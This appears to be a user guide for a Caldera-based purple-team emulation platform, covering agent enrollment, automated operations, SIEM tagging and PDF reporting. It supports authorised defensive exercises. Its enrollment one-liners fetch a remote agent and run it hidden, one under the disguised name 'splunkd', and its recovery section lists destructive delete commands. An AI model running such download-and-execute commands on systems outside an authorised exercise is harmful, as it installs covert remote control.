@@ -1,0 +1,1118 @@
+PURPLE_TEAM_USER_GUIDE
+Purple Team Automation: Triskele Labs User Guide
+Version: 5.3.0
+Platform: Triskele Labs Command Center (Caldera Fork)
+Last Updated: January 2026
+Table of Contents
+System Architecture Overview
+Workflow 1: The One-Liner Enrollment
+Workflow 2: Automated Operation Execution
+Workflow 3: Intelligent SIEM Tagging
+Workflow 4: One-Click Branded Reporting
+Appendix: Troubleshooting on TL VM
+1. System Architecture Overview
+1.1 The 7-Plugin “Lean Core”
+The Triskele Labs Command Center employs a streamlined architecture optimised for Managed Security Service Providers (MSPs). Our Lean Core consists of seven essential plugins:
+Plugin
+	
+Function
+	
+Resource Impact
+Magma
+	
+Vue.js 3 frontend UI
+	
+Primary interface
+Sandcat
+	
+Cross-platform agent (GoLang)
+	
+Lightweight agent deployment
+Stockpile
+	
+Adversary profiles & abilities library
+	
+Attack playbook repository
+Atomic
+	
+Atomic Red Team integration
+	
+796+ pre-built techniques
+Orchestrator
+	
+Automated workflow engine
+	
+Operation scheduling
+Branding
+	
+Custom UI/reporting theming
+	
+Visual identity
+Reporting
+	
+PDF/HTML report generation
+	
+Executive deliverables
+1.2 Resource Optimisation Strategy (7.7GB RAM)
+The platform is designed to operate within constrained environments:
+┌─────────────────────────────────────────────────────────┐
+│              Memory Allocation Strategy                  │
+├─────────────────────────────────────────────────────────┤
+│  Caldera Core Server      │  ~1.5 GB                    │
+│  Plugin Overhead          │  ~0.5 GB                    │
+│  Active Operations        │  ~1.0 GB (variable)         │
+│  System Reserve           │  ~1.0 GB                    │
+│  ELK Stack (External)     │  Offloaded to separate VM   │
+├─────────────────────────────────────────────────────────┤
+│  Available Headroom       │  ~3.7 GB                    │
+└─────────────────────────────────────────────────────────┘
+​
+Key Optimisation Techniques:
+- Disabled non-essential plugins (training, emu, access)
+- Asynchronous operation processing via aiohttp
+
+- Lazy-loading of ability definitions
+- External SIEM integration (no local log storage)
+2. Workflow 1: The One-Liner Enrollment
+2.1 Overview
+The One-Liner Enrollment feature eliminates the need for RDP access during agent deployment. Security teams can deploy agents across client environments using a single command.
+2.2 Step-by-Step: Agent Enrollment
+Step 1: Access the Agents Page
+Navigate to Campaigns → Agents in the Command Center.
+http://calderaIP:8888/agents
+​
+Step 2: Click “Deploy Agent”
+Select the “Click to Deploy” button to open the deployment modal.
+Step 3: Select Platform & Configuration
+Parameter
+	
+Windows
+	
+Linux/macOS
+Platform
+	
+windows
+	
+linux
+ / darwin
+Agent
+	
+sandcat
+	
+sandcat
+Contact
+	
+HTTP
+	
+HTTP
+Server
+	
+http://<SERVER_IP>:8888
+	
+http://<SERVER_IP>:8888
+Step 4: Copy the One-Liner
+PowerShell (Windows):
+$server="http://192.168.1.100:8888";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go-windows");
+$data=$wc.DownloadData($url);
+$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+Get-Process | ? {$_.Path -like "*$name*"} | Stop-Process -Force -ErrorAction SilentlyContinue;
+rm -force "C:\Users\Public\$name" -ErrorAction SilentlyContinue;
+[io.file]::WriteAllBytes("C:\Users\Public\$name",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\$name -ArgumentList "-server$server -group red" -WindowStyle Hidden;
+​
+Bash (Linux/macOS):
+server="http://192.168.1.100:8888";
+curl -s -X POST -H "file:sandcat.go-linux" -H "platform:linux" \
+  $server/file/download > splunkd;
+chmod +x splunkd;
+./splunkd -server $server -group red &
+​
+Step 5: Execute on Target
+Deploy via:
+- Remote PowerShell (WinRM)
+- SSH Session
+- RMM Tool (ConnectWise, Datto, NinjaRMM)
+- GPO Startup Script
+2.3 Zero-RDP Advantage
+Traditional Method
+	
+Triskele One-Liner
+RDP to each machine
+	
+Execute remotely via RMM/SSH
+15-20 min per host
+	
+< 30 seconds per host
+Screen recording required
+	
+Command-line audit trail
+Interactive session
+	
+Non-interactive execution
+3. Workflow 2: Automated Operation Execution
+3.1 Overview
+The Orchestrator plugin enables Consolidated Workflows that automate attack sequences. Target: 30+ automated attacks per 4-hour session.
+3.2 Creating an Operation
+Step 1: Navigate to Operations
+http://localhost:8888/operations
+​
+Step 2: Click “Create Operation”
+Configure the operation:
+Field
+	
+Recommended Value
+Name
+	
+PURPLE-<CLIENT>-<DATE>
+Adversary
+	
+Select pre-built profile
+Planner
+	
+atomic
+ (sequential) or batch
+Fact Source
+	
+basic
+ or client-specific
+Auto-close
+	
+Enabled
+Obfuscator
+	
+plain-text
+ (for visibility)
+Step 3: Select Adversary Profile
+Pre-configured adversary profiles in Stockpile:
+# Example: Discovery-focused adversary
+name: Network Discovery
+description: MITRE ATT&CK Discovery techniques
+atomic_ordering:
+- T1016    # System Network Configuration Discovery
+- T1049    # System Network Connections Discovery
+- T1082    # System Information Discovery
+- T1083    # File and Directory Discovery
+- T1087    # Account Discovery
+- T1135    # Network Share Discovery
+​
+Step 4: Start Operation
+Click “Start” to begin automated execution.
+3.3 Orchestrator Consolidated Workflow
+The Orchestrator triggers operations programmatically:
+# orchestrator/hook.py - Simplified workflow
+async def execute_consolidated_workflow(services):
+    """
+    Automated purple team workflow:
+    1. Verify agent enrollment
+    2. Execute operation
+    3. Tag SIEM events
+    4. Generate report
+    """
+    # Get active agents
+    agents = await services.get('data_svc').locate('agents')
+
+    # Create operation
+    operation = await services.get('rest_svc').create_operation(
+        name=f"AUTO-{datetime.now().strftime('%Y%m%d-%H%M')}",
+        adversary_id="<adversary-uuid>",
+        planner="atomic",
+        group="red"
+    )
+
+    # Start execution
+    await services.get('rest_svc').update_operation(
+        operation.id,
+        state="running"
+    )
+​
+3.4 API-Driven Operation Control
+# Start operation via REST API
+curl -X PATCH http://localhost:8888/api/v2/operations/<OP_ID> \
+  -H "Content-Type: application/json" \
+  -d '{"state": "running"}'
+
+# Check operation status
+curl http://localhost:8888/api/v2/operations/<OP_ID>
+
+# List all abilities executed
+curl http://localhost:8888/api/v2/operations/<OP_ID>/links
+​
+4. Workflow 3: Intelligent SIEM Tagging
+4.1 Overview
+The Intelligent SIEM Tagging feature eliminates manual alert closure by automatically tagging simulated attack logs with purple_team_exercise=true
+.
+4.2 The post_operation_start
+ Hook
+When an operation begins, the Orchestrator triggers SIEM notification:
+# orchestrator/hook.py
+from plugins.orchestrator.app.siem_connector import SIEMConnector
+
+class OrchestatorService:
+
+    async def post_operation_start(self, operation):
+        """
+        Hook: Called when operation state changes to 'running'
+        """
+        siem = SIEMConnector(
+            host=os.getenv('ELK_HOST', 'localhost'),
+            port=os.getenv('ELK_PORT', 9200)
+        )
+
+        # Tag time window in SIEM
+        await siem.create_exercise_window(
+            start_time=operation.start,
+            operation_id=operation.id,
+            source_ips=self._get_agent_ips(operation),
+            tag="purple_team_exercise=true"
+        )
+​
+4.3 ELK Integration Configuration
+Set environment variables before starting the server:
+export ELK_HOST="192.168.1.50"
+export ELK_PORT="9200"
+export ELK_INDEX="purple-team-*"
+export ELK_API_KEY="your-api-key-here"
+
+python3 server.py --insecure
+
+
+5. Workflow 4: Automated PDF Report Generation
+
+5.1 Overview
+The Reporting plugin automatically generates branded PDF reports when operations complete. Reports include technique execution timelines, command outputs, and optional detection correlation from ELK.
+
+5.2 How Report Generation Works
+
+The reporting system uses Caldera's event-driven architecture—no manual triggering required:
+
+┌──────────────────────────────────────────────────────────────┐
+│            Automated Report Generation Flow                   │
+├──────────────────────────────────────────────────────────────┤
+│  1. Operation Completes                                      │
+│     └─> operation.finish() fires event                       │
+│                                                              │
+│  2. Event System Broadcasts                                  │
+│     └─> event_svc.fire_event(                               │
+│           exchange='operation',                             │
+│           queue='completed',                                │
+│           op=operation_id                                   │
+│         )                                                    │
+│                                                              │
+│  3. Multiple Subscribers React (Concurrent)                  │
+│     ├─> Orchestrator: Tags operation in ELK                 │
+│     └─> Reporting: Generates PDF report                     │
+│                                                              │
+│  4. PDF Available                                            │
+│     └─> data/reports/<operation_name>.pdf                   │
+└──────────────────────────────────────────────────────────────┘
+
+5.3 Event Subscription Pattern
+
+Plugins subscribe to events during initialisation (in hook.py):
+
+# plugins/reporting/hook.py
+async def initialize(app, services):
+    event_svc = services.get('event_svc')
+    
+    # Subscribe to operation completion events
+    if event_svc:
+        await event_svc.observe_event(
+            callback=report_svc.on_operation_completed,
+            exchange='operation',
+            queue='completed'
+        )
+        logger.info('✅ Reporting plugin: Subscribed to operation.completed events')
+
+The callback receives the operation ID and generates the report automatically:
+
+# plugins/reporting/app/report_svc.py
+async def on_operation_completed(self, op: Optional[str] = None, **kwargs):
+    """
+    Event handler: Auto-generate PDF when operation finishes.
+    
+    Args:
+        op: Operation ID string (Caldera passes ID, not object)
+        **kwargs: Event metadata
+    """
+    # Fetch operation from data service
+    operations = await self.data_svc.locate('operations', match=dict(id=op))
+    operation = operations[0]
+    
+    # Generate PDF in background thread (non-blocking)
+    pdf_path = await self._generate_pdf_async(operation)
+
+5.4 Manual Report Generation (API)
+
+For on-demand report generation, use the REST API:
+
+# Generate report for specific operation
+curl -X POST http://localhost:8888/plugin/reporting/generate \
+  -H "Content-Type: application/json" \
+  -d '{"operation_id": "abc-123-def-456"}'
+
+# Response
+{
+  "success": true,
+  "pdf_path": "/path/to/report.pdf",
+  "generation_time_ms": 4230
+}
+
+# Download the PDF
+curl http://localhost:8888/plugin/reporting/download/abc-123-def-456 \
+  --output report.pdf
+
+5.5 Report Configuration
+
+Configure report branding and ELK correlation in plugins/reporting/app/config.py:
+
+class ReportingConfig:
+    # PDF Metadata
+    COMPANY_NAME = "Triskele Labs"
+    REPORT_TITLE = "Purple Team Exercise Report"
+    
+    # ELK Detection Correlation (optional)
+    ELK_ENABLED = True
+    ELK_HOST = "20.28.49.97"
+    ELK_PORT = 9200
+    ELK_INDEX = "purple-team-logs"
+    
+    # Performance Tuning
+    THREAD_POOL_SIZE = 1  # Single worker (CPU-bound)
+    PDF_TIMEOUT_SECONDS = 30
+
+
+6. Understanding Caldera's Event-Driven Architecture
+
+6.1 The Service Layer
+
+Caldera uses a service-oriented architecture where plugins access core functionality through injected services:
+
+┌─────────────────┬─────────────────────────┬──────────────────────────────────────────────┐
+│ Core Service    │ Purpose                 │ Example Usage                                │
+├─────────────────┼─────────────────────────┼──────────────────────────────────────────────┤
+│ data_svc        │ Object persistence      │ await data_svc.locate('operations',         │
+│                 │ & retrieval             │   {'id': op_id})                             │
+├─────────────────┼─────────────────────────┼──────────────────────────────────────────────┤
+│ event_svc       │ Pub/sub event system    │ await event_svc.fire_event(                 │
+│                 │                         │   exchange='operation', queue='completed')   │
+├─────────────────┼─────────────────────────┼──────────────────────────────────────────────┤
+│ contact_svc     │ Agent communication     │ await contact_svc.handle_heartbeat()         │
+├─────────────────┼─────────────────────────┼──────────────────────────────────────────────┤
+│ rest_svc        │ REST API operations     │ await rest_svc.create_operation(...)         │
+├─────────────────┼─────────────────────────┼──────────────────────────────────────────────┤
+│ planning_svc    │ Attack planning logic   │ await planning_svc.get_links(operation)      │
+├─────────────────┼─────────────────────────┼──────────────────────────────────────────────┤
+│ file_svc        │ Payload/file storage    │ await file_svc.save_file('payload.exe')      │
+└─────────────────┴─────────────────────────┴──────────────────────────────────────────────┘
+
+6.2 Event System Deep Dive
+
+Caldera's event system enables loose coupling between plugins. Events are broadcast to all subscribers without the publisher knowing who's listening.
+
+Event Exchanges & Queues:
+
+┌─────────────┬────────────────┬───────────────────────┬────────────────────────┐
+│ Exchange    │ Queue          │ Fired When            │ Typical Subscribers    │
+├─────────────┼────────────────┼───────────────────────┼────────────────────────┤
+│ operation   │ completed      │ Operation finishes    │ Reporting,             │
+│             │                │                       │ Orchestrator           │
+├─────────────┼────────────────┼───────────────────────┼────────────────────────┤
+│ operation   │ state_change   │ State transitions     │ UI updates, monitoring │
+├─────────────┼────────────────┼───────────────────────┼────────────────────────┤
+│ agent       │ heartbeat      │ Agent checks in       │ Contact handlers       │
+├─────────────┼────────────────┼───────────────────────┼────────────────────────┤
+│ ability     │ executed       │ Technique runs        │ Logging, analytics     │
+└─────────────┴────────────────┴───────────────────────┴────────────────────────┘
+
+Event Flow Example:
+
+# 1. Publisher (app/objects/c_operation.py)
+async def finish(self):
+    self.state = 'finished'
+    await self.services.get('event_svc').fire_event(
+        exchange='operation',
+        queue='completed',
+        op=self.id  # Operation ID string
+    )
+
+# 2. Subscriber (plugins/reporting/hook.py)
+await event_svc.observe_event(
+    callback=report_svc.on_operation_completed,
+    exchange='operation',
+    queue='completed'
+)
+
+# 3. Handler receives event (plugins/reporting/app/report_svc.py)
+async def on_operation_completed(self, op: Optional[str] = None, **kwargs):
+    # op = operation ID string
+    # kwargs = additional event metadata
+    operations = await self.data_svc.locate('operations', match={'id': op})
+
+6.3 Plugin Communication Patterns
+
+Pattern 1: Event-Driven (Recommended)
+Best for: Loose coupling, multiple subscribers, async workflows
+
+# Publisher doesn't know who's listening
+await event_svc.fire_event(exchange='custom', queue='data_ready', payload=data)
+
+✅ Pros: Decoupled, scalable, async-friendly
+❌ Cons: No direct return values, harder to debug
+
+Pattern 2: Direct Service Calls
+Best for: Synchronous workflows, explicit dependencies
+
+# Direct method invocation
+report_svc = services.get('report_svc')
+result = await report_svc.generate_report_api(request)
+
+✅ Pros: Explicit, debuggable, return values
+❌ Cons: Tight coupling, plugin dependencies
+
+Pattern 3: REST API
+Best for: External integrations, cross-network calls
+
+# HTTP endpoint calls
+async with aiohttp.ClientSession() as session:
+    await session.post('http://localhost:8888/api/v2/operations', json=data)
+
+✅ Pros: Language-agnostic, network-accessible
+❌ Cons: Latency, auth overhead
+
+6.4 Plugin Lifecycle Hooks
+
+Plugins implement hooks in hook.py to integrate with Caldera:
+
+┌─────────────────────────────┬──────────────────┬──────────────────────────────┐
+│ Hook Function               │ When Called      │ Use Case                     │
+├─────────────────────────────┼──────────────────┼──────────────────────────────┤
+│ initialize(app, services)   │ Server startup   │ Register routes, subscribe   │
+│                             │                  │ to events                    │
+├─────────────────────────────┼──────────────────┼──────────────────────────────┤
+│ enable(services)            │ Plugin activation│ Start background tasks       │
+├─────────────────────────────┼──────────────────┼──────────────────────────────┤
+│ disable(services)           │ Plugin           │ Stop tasks, cleanup          │
+│                             │ deactivation     │ resources                    │
+└─────────────────────────────┴──────────────────┴──────────────────────────────┘
+
+Example plugin initialisation:
+
+# plugins/reporting/hook.py
+async def initialize(app, services):
+    # 1. Create service instance
+    report_svc = ReportService(services)
+    
+    # 2. Register REST endpoints
+    app.router.add_route('POST', '/plugin/reporting/generate', 
+                        report_svc.generate_report_api)
+    
+    # 3. Subscribe to events
+    await services.get('event_svc').observe_event(
+        callback=report_svc.on_operation_completed,
+        exchange='operation',
+        queue='completed'
+    )
+    
+    # 4. Store service reference
+    services['report_svc'] = report_svc
+
+
+7. Troubleshooting Common Issues
+
+7.1 AttributeError: 'ReportService' object has no attribute 'generate_report'
+
+Error Signature:
+ERROR Report generation failed: 'ReportService' object has no attribute 'generate_report'
+AttributeError: 'ReportService' object has no attribute 'generate_report'
+
+Root Cause:
+A plugin is trying to call report_svc.generate_report(operation), but this method doesn't exist. 
+The ReportService has these methods:
+- generate_report_api(request) - REST API endpoint (requires HTTP request object)
+- on_operation_completed(op, **kwargs) - Event handler (requires operation ID string)
+- list_reports(request) - List available PDFs
+- download_report(request) - Serve PDF files
+
+Resolution:
+Don't manually call report generation. The reporting plugin automatically subscribes to 
+operation.completed events. When an operation finishes, the event system triggers 
+on_operation_completed() automatically.
+
+If you're seeing this error in orchestrator_svc.py:
+
+# ❌ WRONG - This method doesn't exist
+await report_svc.generate_report(operation)
+
+# ✅ CORRECT - Delete the manual call entirely
+# The reporting plugin handles this via event subscription
+# No code needed—event system does it automatically
+
+Why This Happens:
+- Caldera uses event-driven architecture
+- Plugins subscribe to events in hook.py
+- Multiple plugins can react to the same event independently
+- Manual triggering creates duplicate work and tight coupling
+
+7.2 Reports Not Generating Automatically
+
+Symptoms:
+- Operation completes successfully
+- No PDF appears in data/reports/
+- No errors in logs
+
+Diagnosis Checklist:
+
+1. Check event subscription (look for this log on startup):
+✅ Reporting plugin: Subscribed to operation.completed events
+
+If missing, event_svc might not be available.
+
+2. Verify operation state is 'finished':
+# Operation must reach 'finished' state
+curl http://localhost:8888/api/v2/operations/<OP_ID> | jq .state
+
+# Should return: "finished"
+
+3. Check for duplicate generation prevention:
+# If you see this, report is already being generated
+WARNING Report already being generated for operation <OP_ID>
+
+4. Check thread pool initialisation:
+# Should see this on startup
+✅ ReportService initialized (ThreadPoolExecutor ready)
+
+5. Manual trigger for testing:
+curl -X POST http://localhost:8888/plugin/reporting/generate \
+  -H "Content-Type: application/json" \
+  -d '{"operation_id": "<OP_ID>"}'
+
+7.3 ELK Connection Failures
+
+Symptoms:
+WARNING ELK fetcher initialization failed (non-fatal): Connection refused
+ERROR Failed to correlate detections from ELK: HTTPConnectionPool
+
+Resolution:
+ELK integration is optional. Reports will still generate without detection correlation.
+
+To fix ELK connectivity:
+
+1. Verify ELK is reachable:
+curl http://<ELK_HOST>:9200/_cluster/health
+
+2. Check config in plugins/reporting/app/config.py:
+ELK_ENABLED = True
+ELK_HOST = "20.28.49.97"  # Update to your ELK IP
+ELK_PORT = 9200
+ELK_INDEX = "purple-team-logs"
+
+3. Test ELK from Python:
+from elasticsearch import AsyncElasticsearch
+es = AsyncElasticsearch([{'host': '20.28.49.97', 'port': 9200}])
+await es.ping()  # Should return True
+
+7.4 Server Won't Start (Port Already in Use)
+
+Error:
+OSError: [Errno 48] Address already in use
+
+Diagnosis:
+# Find process using port 8888
+lsof -i :8888
+
+# Kill the process
+kill -9 <PID>
+
+# Alternative: Kill by name
+pkill -9 -f "python server.py"
+
+Prevention:
+# Always shutdown gracefully (Ctrl+C once)
+# Allows cleanup hooks to execute
+
+7.5 Plugin Not Loading
+
+Symptoms:
+Plugin listed in conf/local.yml but not appearing in UI
+
+Diagnosis:
+
+1. Check plugins are enabled in conf/local.yml:
+plugins:
+  - atomic
+  - orchestrator
+  - reporting
+  - stockpile
+  - magma
+  - sandcat
+  - branding
+
+2. Check hook.py syntax errors:
+# Look for this in startup logs
+ERROR Failed to load plugin 'reporting': <error message>
+
+3. Verify hook.py has required functions:
+# Minimum required hook
+name = 'reporting'
+description = 'PDF report generation'
+address = '/plugin/reporting/gui'
+
+async def initialize(app, services):
+    pass
+
+4. Check dependencies are installed:
+# For reporting plugin
+pip install reportlab pillow aiohttp
+
+7.6 Memory Exhaustion (7.7GB RAM Limit)
+
+Symptoms:
+- Server becomes unresponsive
+- MemoryError exceptions
+- Operations timeout
+
+Diagnosis:
+# Monitor memory usage
+ps aux | grep "python server.py"
+# Check VSZ (virtual) and RSS (resident) columns
+
+Prevention Strategies:
+
+1. Disable unused plugins in conf/local.yml:
+# Comment out these if not needed
+plugins:
+  # - training  # Disabled to save RAM
+  # - emu       # Disabled to save RAM
+  - atomic
+  - reporting
+
+2. Limit concurrent operations:
+# Only run 1-2 operations simultaneously
+# Operations share a thread pool to prevent resource exhaustion
+
+3. Cleanup old operations:
+# Delete finished operations via API
+curl -X DELETE http://localhost:8888/api/v2/operations/<OLD_OP_ID>
+
+7.7 Agent Not Checking In
+
+Symptoms:
+- One-liner executes successfully
+- Agent doesn't appear in UI
+
+Diagnosis:
+
+1. Check agent process is running:
+# Windows
+Get-Process | Where-Object {$_.Path -like "*sandcat*"}
+
+# Linux/macOS
+ps aux | grep splunkd
+
+2. Check firewall rules:
+# Agent needs outbound access to port 8888
+# Test from agent machine
+curl http://<CALDERA_SERVER>:8888/api/v2/health
+
+3. Verify server URL in deployment command:
+# Ensure server IP is reachable from agent
+$server="http://192.168.1.100:8888"  # Must be accessible
+
+4. Check contact service is running:
+# Should see these logs on server
+INFO contact (HTTP) listening on 0.0.0.0:8888
+
+7.8 Operation Stuck in 'Running' State
+
+Symptoms:
+- Operation doesn't transition to 'finished'
+- No new links being executed
+
+Diagnosis:
+
+1. Check for waiting links:
+curl http://localhost:8888/api/v2/operations/<OP_ID>/links | \
+  jq '.[] | select(.status == -1)'
+# -1 = waiting, 0 = success, 1 = failure
+
+2. Manually advance operation:
+# Stop the operation
+curl -X PATCH http://localhost:8888/api/v2/operations/<OP_ID> \
+  -H "Content-Type: application/json" \
+  -d '{"state": "finished"}'
+
+3. Check planner logic:
+# Atomic planner: Executes sequentially
+# Batch planner: Executes all at once
+# If stuck, change planner and restart
+
+7.9 PDF Generation Timeout
+
+Symptoms:
+ERROR Report generation timed out after 30 seconds
+
+Causes:
+- Large operations (100+ techniques)
+- ELK query taking too long
+- Thread pool exhausted
+
+Resolution:
+
+1. Increase timeout in config.py:
+PDF_TIMEOUT_SECONDS = 60  # Increase from 30
+
+2. Disable ELK correlation for large ops:
+ELK_ENABLED = False  # Speeds up generation
+
+3. Check thread pool status:
+# Look for this in logs
+ThreadPoolExecutor: 1/1 workers busy
+# If stuck, restart server to reset pool
+
+
+8. Advanced Configuration & Best Practices
+
+8.1 Production Deployment Checklist
+
+☐ Change default credentials (conf/local.yml)
+☐ Enable HTTPS (remove --insecure flag)
+☐ Configure firewall (port 8888 ingress)
+☐ Set up ELK integration for detection correlation
+☐ Configure automated backups of data/ folder
+☐ Set up log rotation for server logs
+☐ Test agent deployment across all OS types
+☐ Create custom adversary profiles for client
+☐ Brand reports with client logo/colours
+☐ Document incident response contact procedures
+
+8.2 Performance Tuning
+
+For Constrained Environments (< 8GB RAM):
+
+# conf/local.yml
+plugins:
+  - atomic
+  - reporting
+  - orchestrator
+  - stockpile
+  - magma
+  - sandcat
+  # Disable these to save ~400MB
+  # - training
+  # - emu
+  # - compass
+
+# Reduce ability cache
+app.contact.max_abilities: 50  # Default: 100
+
+# Limit concurrent operations
+max_concurrent_operations: 2
+
+For High-Performance Environments (16GB+ RAM):
+
+# Enable aggressive caching
+app.cache.abilities: true
+app.cache.adversaries: true
+
+# Increase thread pools
+reporting.thread_pool_size: 3
+orchestrator.max_workers: 4
+
+8.3 Security Hardening
+
+Production deployments should implement:
+
+1. API Key Authentication:
+# conf/local.yml
+api_key_red: '<generate-strong-key>'
+api_key_blue: '<generate-strong-key>'
+
+# Add to agent deployment
+./splunkd -server $server -group red -api_key <KEY>
+
+2. SSL/TLS Configuration:
+# Generate self-signed cert (testing only)
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+
+# Start server with SSL
+python server.py --ssl-cert cert.pem --ssl-key key.pem
+
+3. Network Segmentation:
+- Deploy Caldera server in isolated VLAN
+- Use jump hosts for agent access
+- Restrict port 8888 to SOC team IPs only
+
+8.4 Backup & Disaster Recovery
+
+Critical Directories to Backup:
+
+/data/object_store          # Operations, agents, results
+/data/payloads              # Custom payloads
+/data/sources               # Fact sources
+/data/reports               # Generated PDFs
+/conf/local.yml             # Server configuration
+/plugins/*/data/            # Plugin-specific data
+
+Backup Script Example:
+
+#!/bin/bash
+BACKUP_DIR="/backup/caldera/$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$BACKUP_DIR"
+
+# Backup data
+cp -r /opt/caldera/data "$BACKUP_DIR/"
+cp -r /opt/caldera/conf "$BACKUP_DIR/"
+cp -r /opt/caldera/plugins/reporting/data "$BACKUP_DIR/"
+
+# Compress
+tar -czf "$BACKUP_DIR.tar.gz" "$BACKUP_DIR"
+rm -rf "$BACKUP_DIR"
+
+# Retain last 7 days only
+find /backup/caldera -name "*.tar.gz" -mtime +7 -delete
+
+
+9. Extending Caldera: Custom Plugin Development
+
+9.1 Plugin Anatomy
+
+Minimum plugin structure:
+
+plugins/myplugin/
+├── hook.py              # Entry point (required)
+├── README.md            # Documentation
+├── requirements.txt     # Python dependencies
+├── app/
+│   ├── __init__.py
+│   └── my_service.py    # Business logic
+├── data/                # Plugin-specific data
+├── static/              # Frontend assets (CSS/JS)
+└── templates/           # HTML templates (Jinja2)
+
+9.2 Example: Custom Notification Plugin
+
+Create plugins/notifier/hook.py:
+
+name = 'notifier'
+description = 'Slack notifications for operation events'
+address = '/plugin/notifier/gui'
+
+async def initialize(app, services):
+    from plugins.notifier.app.notifier_svc import NotifierService
+    
+    # Create service
+    notifier_svc = NotifierService(services)
+    
+    # Subscribe to events
+    event_svc = services.get('event_svc')
+    await event_svc.observe_event(
+        callback=notifier_svc.on_operation_started,
+        exchange='operation',
+        queue='started'
+    )
+    await event_svc.observe_event(
+        callback=notifier_svc.on_operation_completed,
+        exchange='operation',
+        queue='completed'
+    )
+    
+    # Register API
+    app.router.add_route('POST', '/plugin/notifier/config', 
+                        notifier_svc.update_config)
+    
+    services['notifier_svc'] = notifier_svc
+
+Create plugins/notifier/app/notifier_svc.py:
+
+import aiohttp
+import logging
+from aiohttp import web
+
+class NotifierService:
+    def __init__(self, services):
+        self.services = services
+        self.log = logging.getLogger('notifier')
+        self.slack_webhook = None  # Configure via API
+    
+    async def on_operation_started(self, op=None, **kwargs):
+        """Event handler: Notify when operation starts."""
+        operations = await self.services.get('data_svc').locate('operations', {'id': op})
+        operation = operations[0]
+        
+        await self._send_slack(
+            f"🔴 Purple Team Exercise Started: {operation.name}",
+            f"Adversary: {operation.adversary.name}\nAgent Group: {operation.group}"
+        )
+    
+    async def on_operation_completed(self, op=None, **kwargs):
+        """Event handler: Notify when operation completes."""
+        operations = await self.services.get('data_svc').locate('operations', {'id': op})
+        operation = operations[0]
+        
+        total_links = len(operation.chain)
+        successful = len([l for l in operation.chain if l.status == 0])
+        
+        await self._send_slack(
+            f"✅ Purple Team Exercise Completed: {operation.name}",
+            f"Techniques Executed: {successful}/{total_links}"
+        )
+    
+    async def _send_slack(self, title, message):
+        """Send Slack notification."""
+        if not self.slack_webhook:
+            self.log.warning("Slack webhook not configured")
+            return
+        
+        payload = {
+            "text": f"*{title}*\n{message}"
+        }
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.post(self.slack_webhook, json=payload) as resp:
+                if resp.status == 200:
+                    self.log.info(f"Slack notification sent: {title}")
+                else:
+                    self.log.error(f"Slack notification failed: {resp.status}")
+    
+    async def update_config(self, request):
+        """API endpoint: Configure Slack webhook."""
+        data = await request.json()
+        self.slack_webhook = data.get('webhook_url')
+        return web.json_response({'success': True})
+
+Enable plugin in conf/local.yml:
+
+plugins:
+  - atomic
+  - reporting
+  - orchestrator
+  - notifier  # Add your custom plugin
+
+9.3 Common Plugin Patterns
+
+Data Persistence:
+
+# Store custom data
+await self.services.get('data_svc').store(
+    'my_custom_objects',
+    [{'id': '123', 'data': 'value'}]
+)
+
+# Retrieve custom data
+objects = await self.services.get('data_svc').locate('my_custom_objects', {'id': '123'})
+
+Event Publishing:
+
+# Fire custom events
+await self.services.get('event_svc').fire_event(
+    exchange='custom',
+    queue='my_event',
+    custom_data={'key': 'value'}
+)
+
+Background Tasks:
+
+# Start async task on plugin enable
+async def enable(services):
+    asyncio.create_task(my_background_worker(services))
+
+async def my_background_worker(services):
+    while True:
+        await asyncio.sleep(300)  # Every 5 minutes
+        # Do periodic work
+
+
+Appendix: Quick Reference
+
+A.1 Caldera Service Methods
+
+data_svc:
+  - locate(object_name, match={}) → list[objects]
+  - store(object_name, objects) → None
+  - remove(object_name, match={}) → None
+
+event_svc:
+  - fire_event(exchange, queue, **kwargs) → None
+  - observe_event(callback, exchange, queue) → None
+
+contact_svc:
+  - handle_heartbeat(**profile) → (agent, instructions)
+  - register_contact(contact) → None
+
+rest_svc:
+  - create_operation(name, adversary_id, group, ...) → Operation
+  - update_operation(op_id, state=...) → Operation
+
+planning_svc:
+  - get_links(operation, agent=None) → list[Link]
+
+A.2 Common REST API Endpoints
+
+# Operations
+GET    /api/v2/operations
+POST   /api/v2/operations
+GET    /api/v2/operations/<OP_ID>
+PATCH  /api/v2/operations/<OP_ID>
+DELETE /api/v2/operations/<OP_ID>
+
+# Agents
+GET    /api/v2/agents
+DELETE /api/v2/agents/<AGENT_PAWN>
+
+# Abilities
+GET    /api/v2/abilities
+GET    /api/v2/abilities/<ABILITY_ID>
+
+# Adversaries
+GET    /api/v2/adversaries
+POST   /api/v2/adversaries
+
+# Reporting (Custom)
+POST   /plugin/reporting/generate
+GET    /plugin/reporting/download/<OP_ID>
+
+A.3 Event Reference
+
+operation.started       → Operation began execution
+operation.completed     → Operation finished (all links done)
+operation.state_change  → Any state transition
+agent.heartbeat         → Agent checked in
+ability.executed        → Technique ran on agent
+
+A.4 Useful Log Locations
+
+Server logs:           stdout (or redirect to file)
+Plugin logs:           Prefixed with [plugin_name]
+Error stack traces:    Look for "Traceback (most recent call last)"
+Event subscriptions:   "✅ <plugin>: Subscribed to <exchange>.<queue> events"
+
+A.5 Emergency Recovery Commands
+
+# Kill stuck server
+pkill -9 -f "python server.py"
+
+# Reset operations (keeps agents)
+rm -rf data/object_store
+
+# Remove all agents
+rm -rf data/agents.db
+
+# Clean all reports
+rm -rf plugins/reporting/data/reports/*
+
+# Fresh start (nuclear option)
+git clean -fdx data/
+python server.py --insecure --fresh
+
+
+---
+
+Document Version: 5.3.1
+Last Updated: January 2026
+Contributors: Triskele Labs Engineering Team
+Support: Use GitHub Issues for bug reports
+Licence: Caldera is Apache 2.0 licenced (MITRE Corporation)
